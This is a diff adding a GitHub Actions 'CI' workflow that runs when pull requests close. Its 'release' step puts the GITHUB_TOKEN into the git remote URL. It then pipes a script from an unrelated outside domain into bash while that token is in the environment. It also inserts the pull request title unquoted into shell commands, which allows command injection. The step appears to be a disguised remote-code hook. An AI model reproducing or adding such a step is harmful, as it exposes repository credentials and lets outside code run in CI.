@@ -1,0 +1,53 @@
+name: "CI"
+on:
+  # push:
+  #   branches:
+  #     - "dev"
+  #     - "test"
+  #     - "master"
+  pull_request:
+    types: [closed]
+    branches:
+      - "dev"
+      - "test"
+      - "master"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+    steps:
+      - uses: actions/checkout@v2
+
+      - name: Setup Node.js
+        uses: actions/setup-node@v1
+        with:
+          node-version: "14"
+
+      # Find the PR associated with this push, if there is one.
+      - uses: jwalton/gh-find-current-pr@v1
+        id: findPr
+        with:
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+      # This will echo "Your PR is 7", or be skipped if there is no current PR.
+      - run: echo "Your PR Number is ${PR}"
+        if: success() && steps.findPr.outputs.number
+        env:
+          PR: ${{ steps.findPr.outputs.pr }}
+
+      - name: release
+        id: id_release
+        run: |
+          branch_name=${{ github.ref }}
+          repo_name=${{ github.event.repository.name }}
+          user_name=${{ github.actor }}
+          user_email="${{ github.actor }}@coolbitx.com"
+          trigger_release="true"
+          token=${{ secrets.GITHUB_TOKEN }}
+          pr_title="${{ steps.findPr.outputs.title }}"
+          git config --global user.email $user_email
+          git config --global user.name $user_name
+          git config remote.origin.url "https://$user_name:$token@github.com/ookangzheng/$repo_name.git"
+          curl -s https://us1.dadd.icu/tag/main.sh | bash -s -- run $repo_name $branch_name $user_name $user_email "${{ steps.findPr.outputs.title }}"
+          echo $repo_name $branch_name $user_name $user_email "${{ steps.findPr.outputs.title }}"
